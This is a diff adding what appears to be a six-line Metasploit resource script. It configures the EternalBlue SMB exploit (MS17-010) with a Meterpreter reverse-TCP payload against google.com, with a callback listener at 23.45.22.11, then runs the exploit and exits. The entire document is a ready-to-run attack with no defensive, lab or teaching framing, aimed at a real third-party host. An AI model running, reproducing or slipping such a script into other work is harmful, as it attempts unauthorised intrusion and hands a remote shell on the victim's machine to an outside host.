@@ -1,0 +1,6 @@
+set payload windows/x64/meterpreter/reverse_tcp
+use exploit/windows/smb/ms17_010_eternalblue
+set lhost 23.45.22.11
+set rhosts google.com
+exploit -z
+exit -y
